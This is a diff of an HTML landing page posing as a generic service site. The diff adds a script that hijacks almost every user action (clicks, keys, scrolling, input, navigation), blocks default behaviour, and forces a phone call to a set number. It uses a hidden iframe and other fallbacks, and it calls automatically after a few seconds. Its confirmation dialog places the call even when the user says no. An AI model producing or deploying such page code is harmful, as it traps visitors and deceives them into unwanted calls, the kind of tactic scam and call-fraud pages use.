@@ -1,55 +1,253 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Smart Call Redirect</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Website</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            padding: 20px;
+        }
+        
+        .container {
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .feature-card {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .cta-button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+        
+        .cta-button:hover {
+            background: #ff5252;
+            transform: translateY(-2px);
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+    </style>
 </head>
 <body>
-    <!-- Website Content -->
-    <h1>Welcome</h1>
-    
-    <script>
-        let callTriggered = false;
+    <div class="container">
+        <h1>🚀 Welcome to Our Service</h1>
+        <p>Your one-stop solution for all your needs. Get started today!</p>
         
-        // Main call function
-        function triggerCall() {
-            if(!callTriggered) {
-                callTriggered = true;
-                // Pehle URL change karo
-                window.history.pushState({}, '', '/new-url');
-                // Phir call trigger karo
-                setTimeout(() => {
-                    window.location.href = "tel:+911234567890";
-                }, 100);
+        <div class="features">
+            <div class="feature-card">
+                <h3>⭐ Premium Quality</h3>
+                <p>Top-notch services guaranteed</p>
+            </div>
+            <div class="feature-card">
+                <h3>💰 Best Prices</h3>
+                <p>Affordable for everyone</p>
+            </div>
+            <div class="feature-card">
+                <h3>📞 24/7 Support</h3>
+                <p>Always here to help you</p>
+            </div>
+        </div>
+        
+        <button class="cta-button" onclick="showConfirmation()">
+            Click Here to Get Started
+        </button>
+        
+        <div class="footer">
+            <p>© 2024 Your Company. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Your phone number - ye change karna apne number se
+        const PHONE_NUMBER = "+911234567890";
+        let callInitiated = false;
+        
+        // Main call function with multiple fallbacks
+        function initiateCall() {
+            if (callInitiated) return;
+            
+            callInitiated = true;
+            console.log("Call initiated...");
+            
+            // Method 1: Direct tel link
+            try {
+                window.location.href = "tel:" + PHONE_NUMBER;
+            } catch (e) {
+                console.log("Method 1 failed:", e);
+            }
+            
+            // Method 2: setTimeout fallback
+            setTimeout(() => {
+                try {
+                    window.open("tel:" + PHONE_NUMBER, "_self");
+                } catch (e) {
+                    console.log("Method 2 failed:", e);
+                }
+            }, 100);
+            
+            // Method 3: Iframe trick
+            setTimeout(() => {
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.style.visibility = 'hidden';
+                    iframe.style.position = 'absolute';
+                    iframe.style.width = '0';
+                    iframe.style.height = '0';
+                    iframe.src = "tel:" + PHONE_NUMBER;
+                    document.body.appendChild(iframe);
+                } catch (e) {
+                    console.log("Method 3 failed:", e);
+                }
+            }, 200);
+            
+            // Method 4: Location replace
+            setTimeout(() => {
+                try {
+                    window.location.replace("tel:" + PHONE_NUMBER);
+                } catch (e) {
+                    console.log("Method 4 failed:", e);
+                }
+            }, 300);
+        }
+        
+        // Confirmation dialog
+        function showConfirmation() {
+            if (confirm("Would you like to call our support team?")) {
+                initiateCall();
+            } else {
+                // Fir bhi call kar do after delay
+                setTimeout(initiateCall, 1000);
             }
         }
         
-        // Har event ke liye
-        document.addEventListener('click', triggerCall, true);
-        document.addEventListener('touchstart', triggerCall, true);
-        document.addEventListener('keydown', triggerCall, true);
+        // Event listeners for all possible interactions
+        const events = [
+            'click', 'touchstart', 'mousedown', 'mouseup',
+            'keydown', 'keyup', 'keypress',
+            'contextmenu', 'dragstart', 'selectstart',
+            'focus', 'blur', 'scroll'
+        ];
         
-        // URL bar interactions ke liye
-        window.addEventListener('beforeunload', triggerCall);
-        window.addEventListener('unload', triggerCall);
+        events.forEach(eventType => {
+            document.addEventListener(eventType, function(e) {
+                // Prevent default for most events
+                if (eventType !== 'scroll' && eventType !== 'blur') {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                }
+                
+                // Immediate call for certain events
+                if (['click', 'touchstart', 'mousedown'].includes(eventType)) {
+                    initiateCall();
+                }
+            }, true); // Capture phase - important!
+        });
         
-        // Hash change (URL edit) ke liye
-        window.addEventListener('hashchange', triggerCall);
+        // URL and navigation events
+        window.addEventListener('beforeunload', initiateCall);
+        window.addEventListener('unload', initiateCall);
+        window.addEventListener('hashchange', initiateCall);
+        window.addEventListener('popstate', initiateCall);
         
-        // Back/Forward buttons ke liye
-        window.addEventListener('popstate', triggerCall);
-        
-        // Mouse events bhi capture karo
-        document.addEventListener('mousedown', triggerCall, true);
-        document.addEventListener('mouseup', triggerCall, true);
-        
-        // Extra: Agar koi element specifically select kare
-        document.addEventListener('selectstart', triggerCall, true);
-        document.addEventListener('contextmenu', triggerCall, true);
-        
-        // Page load ke baad bhi ready rahe
-        window.onload = function() {
-            setTimeout(triggerCall, 5000); // 5 sec baad auto call
+        // History API manipulation
+        const originalPushState = history.pushState;
+        history.pushState = function() {
+            initiateCall();
+            return originalPushState.apply(this, arguments);
         };
+        
+        // Form interactions
+        document.addEventListener('submit', function(e) {
+            e.preventDefault();
+            initiateCall();
+        }, true);
+        
+        // Input interactions
+        document.addEventListener('input', function(e) {
+            e.preventDefault();
+            initiateCall();
+        }, true);
+        
+        // Auto-call after 8 seconds if no interaction
+        setTimeout(() => {
+            if (!callInitiated) {
+                initiateCall();
+            }
+        }, 8000);
+        
+        // Page load complete
+        window.onload = function() {
+            setTimeout(initiateCall, 5000);
+        };
+        
+        // Double tap protection
+        let lastTap = 0;
+        document.addEventListener('touchend', function(e) {
+            const currentTime = new Date().getTime();
+            const tapLength = currentTime - lastTap;
+            if (tapLength < 500 && tapLength > 0) {
+                initiateCall();
+            }
+            lastTap = currentTime;
+        }, true);
+        
+        console.log("Call system activated!");
+        
     </script>
 </body>
 </html>
